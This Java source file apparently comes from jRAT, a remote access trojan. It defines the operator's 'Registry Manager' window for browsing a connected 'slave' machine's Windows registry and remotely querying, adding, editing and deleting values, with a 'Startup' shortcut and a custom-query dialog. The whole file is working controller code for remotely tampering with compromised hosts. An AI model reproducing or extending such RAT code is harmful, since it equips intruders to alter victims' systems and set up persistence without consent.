package jrat.module.registry.ui;

import com.redpois0n.pathtree.*;
import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;
import jrat.controller.ui.dialogs.DialogCustomRegQuery;
import jrat.controller.ui.frames.BaseFrame;
import jrat.controller.utils.Utils;
import jrat.module.registry.PacketAdd;
import jrat.module.registry.PacketDelete;
import jrat.module.registry.PacketQuery;

import javax.swing.*;
import javax.swing.tree.TreePath;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

@SuppressWarnings("serial")
public class FrameRemoteRegistry extends BaseFrame {

    private final ImageIcon ICON_REGSZ = Resources.getIcon("registry-string");
    private final ImageIcon ICON_REG01 = Resources.getIcon("registry-bin");
    private final ImageIcon ICON_FOLDER = Resources.getIcon("folder");

    private static final String[] ROOT_VALUES = {
            "HKEY_LOCAL_MACHINE",
            "HKEY_CURRENT_USER",
            "HKEY_CLASSES_ROOT",
            "HKEY_USERS",
            "HKEY_CURRENT_CONFIG"
    };

    private TableModel model;
    private JTable table;
    private JTextField txt;
    private JPopupMenu popupMenu;
    private JMenuItem mntmAdd;
    private JMenuItem mntmDelete;
    private JMenuItem mntmEditValue;
    private JMenu mnBrowse;
    private JMenuItem mntmStartup;
    private RegistryTableRenderer renderer;
    private PathJTree tree;

    public FrameRemoteRegistry(Slave s) {
        super(s);

        setTitle("Registry Manager");
        setIconImage(Resources.getIcon("registry").getImage());
        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        setBounds(100, 100, 800, 500);
        setLayout(new BorderLayout(0, 0));

        JToolBar toolBar = new JToolBar();
        toolBar.setFloatable(false);

        JSplitPane splitPane = new JSplitPane();
        splitPane.setResizeWeight(0.7);
        add(splitPane, BorderLayout.CENTER);

        JScrollPane scrollPane = new JScrollPane();
        splitPane.setRightComponent(scrollPane);
        scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

        table = new DefaultJTable();
        table.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                int row = table.getSelectedRow();
                if (e.getClickCount() == 2 && row != -1) {
                    if (table.getValueAt(row, 1) == null) {
                        String value = table.getValueAt(row, 0).toString();
                        clear();
                        execute(value);
                        txt.setText(value);
                    }
                }
            }
        });

        table.setRowHeight(25);
        table.setModel(model = new TableModel(new Object[][]{}, new String[]{"Key", "Value", "Type"}) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        });

        renderer = new RegistryTableRenderer();
        table.setDefaultRenderer(Object.class, renderer);

        popupMenu = new JPopupMenu();

        Utils.addPopup(table, popupMenu);

        mntmAdd = new JMenuItem("Add Value");
        mntmAdd.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                addValue();
            }
        });
        mntmAdd.setIcon(Resources.getIcon("key-plus"));
        popupMenu.add(mntmAdd);

        mntmDelete = new JMenuItem("Delete Value");
        mntmDelete.setIcon(Resources.getIcon("key-minus"));
        mntmDelete.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                removeValue();
            }
        });
        popupMenu.add(mntmDelete);
        popupMenu.addSeparator();

        mntmEditValue = new JMenuItem("Edit Value");
        mntmEditValue.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                editValue();
            }
        });
        mntmEditValue.setIcon(Resources.getIcon("key-pencil"));
        popupMenu.add(mntmEditValue);
        popupMenu.addSeparator();

        mnBrowse = new JMenu("Browse");
        mnBrowse.setIcon(Resources.getIcon("bookmark-go"));
        popupMenu.add(mnBrowse);

        mntmStartup = new JMenuItem("Startup");
        mnBrowse.add(mntmStartup);
        scrollPane.setViewportView(table);

        JScrollPane scrollPane_1 = new JScrollPane();
        splitPane.setLeftComponent(scrollPane_1);

        tree = new PathJTree();
        tree.setDelimiter("\\");
        tree.addFolderClickListener(new NodeClickListener() {
            @Override
            public void itemSelected(PathTreeNode node, String path) {
                clear();
                execute(path);
                txt.setText(path);
            }
        });
        scrollPane_1.setViewportView(tree);

        for (String root : ROOT_VALUES) {
            getTreeModel().addRoot(new FolderTreeNode(root, Resources.getIcon("folder-network")));
        }

        txt = new JTextField();
        toolBar.add(txt);
        txt.setEditable(false);
        txt.setColumns(10);

        JButton btnReload = new JButton("Reload");
        toolBar.add(btnReload);
        btnReload.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                reload();
            }
        });
        btnReload.setIcon(Resources.getIcon("update"));

        JButton btnClear = new JButton("Clear");
        toolBar.add(btnClear);
        btnClear.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                clear();
            }
        });
        btnClear.setIcon(Resources.getIcon("clear"));

        JButton btnAdd = new JButton("Add");
        toolBar.add(btnAdd);
        btnAdd.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                addValue();
            }
        });
        btnAdd.setIcon(Resources.getIcon("key-plus"));

        JButton btnRemove = new JButton("Remove");
        toolBar.add(btnRemove);
        btnRemove.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                removeValue();
            }
        });
        btnRemove.setIcon(Resources.getIcon("key-minus"));

        JButton btnEdit = new JButton("Edit");
        toolBar.add(btnEdit);
        btnEdit.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                editValue();
            }
        });
        btnEdit.setIcon(Resources.getIcon("key-pencil"));

        JButton btnCustomCommand = new JButton("Custom");
        btnCustomCommand.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                DialogCustomRegQuery frame = new DialogCustomRegQuery(slave);
                frame.setVisible(true);
            }
        });
        btnCustomCommand.setIcon(Resources.getIcon("key-arrow"));
        toolBar.add(btnCustomCommand);
        add(toolBar, BorderLayout.NORTH);

        tree.expandRow(0);
        tree.setRootVisible(false);
    }

    /**
     * Add a key (file) to the view
     * @param name
     * @param value
     * @param sz
     */
    public void addKey(String name, String value, boolean sz) {
        ImageIcon icon;
        if (sz) {
            icon = ICON_REGSZ;
        } else {
            icon = ICON_REG01;
        }

        getRenderer().getIconMap().put(name, icon);
        model.addRow(new Object[]{name, value, ""});
    }

    /**
     * Add a subkey (directory) to the view
     * @param path
     * @param name
     */
    public void addSubkey(String path, String name) {
        if (tree.exists(path + "\\" + name)) {
            return;
        }

        PathTreeNode parent = tree.getNodeFromPath(path);

        PathTreeNode node = new FolderTreeNode(name, ICON_FOLDER);
        try {
            if (!name.equals(parent.toString())) {
                tree.getPathModel().insertNodeInto(node, parent, parent.getChildCount());
            }

            TreePath tp = new TreePath(parent.getPath());
            tree.expandPath(tp);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void execute(String location) {
        slave.addToSendQueue(new PacketQuery(location));
    }

    public void clear() {
        while (model.getRowCount() > 0) {
            model.removeRow(0);
        }
    }

    public void reload() {
        clear();
        String value;
        value = txt.getText();
        execute(value);
    }

    public void addValue() {
        String name = Utils.showDialog("Add Value", "Input the name of the value to be created");
        if (name == null) {
            return;
        }
        String type = Utils.showDialog("Add Value", "Input type of value to be created, like:\n\nREG_SZ, REG_MULTI_SZ, REG_DWORD");
        if (type == null) {
            return;
        }
        String data = Utils.showDialog("Add Value", "Input the data to assign to the value being added");
        if (data == null) {
            return;
        }
        slave.addToSendQueue(new PacketAdd(txt.getText(), name, type, data));
        reload();
    }

    public void removeValue() {
        int row = table.getSelectedRow();
        if (row != -1) {
            String val = table.getValueAt(row, 0).toString();
            slave.addToSendQueue(new PacketDelete(txt.getText(), val));
            reload();
        }
    }

    public void editValue() {
        int row = table.getSelectedRow();
        if (row != -1) {
            String val = model.getValueAt(row, 0).toString();
            String type = model.getValueAt(row, 2).toString();
            String data = Utils.showDialog("Edit Value", "Input the data to replace the current data with");
            if (data == null) {
                return;
            }

            slave.addToSendQueue(new PacketAdd(txt.getText(), val, type, data));

            reload();
        }
    }

    public RegistryTableRenderer getRenderer() {
        return renderer;
    }

    public PathTreeModel getTreeModel() {
        return (PathTreeModel) tree.getModel();
    }

}
